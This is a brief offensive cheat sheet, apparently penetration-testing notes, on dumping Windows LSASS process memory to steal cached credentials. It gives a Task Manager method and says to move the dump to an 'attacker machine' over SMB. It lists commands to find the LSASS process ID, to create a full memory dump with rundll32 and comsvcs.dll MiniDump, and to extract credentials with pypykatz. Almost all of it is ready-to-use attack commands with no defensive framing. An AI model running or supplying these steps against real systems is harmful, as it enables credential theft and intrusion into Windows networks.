## Attacking LSASS

### Overview

- **Process:** `lsass.exe` is always running and stores cached credentials, access tokens, etc.
- **Method:** Dump `lsass.exe` memory for credential extraction.

### Dumping LSASS Process Memory

#### Using Task Manager

1. Open Task Manager.
2. Find `lsass.exe`.
3. Create a memory dump.
4. Transfer the dump file to the attacker machine using SMB.

#### Using Rundll32.exe & Comsvcs.dll

##### Finding LSASS PID

- **Using CMD:**

```cmd
tasklist /svc
```

- **Using PowerShell:**

```powershell
Get-Process lsass
```

##### Creating lsass.dmp Using PowerShell

```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <pid> C:\lsass.dmp full
```



#### Using Pypykatz to Extract Credentials from dump

```shell
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```




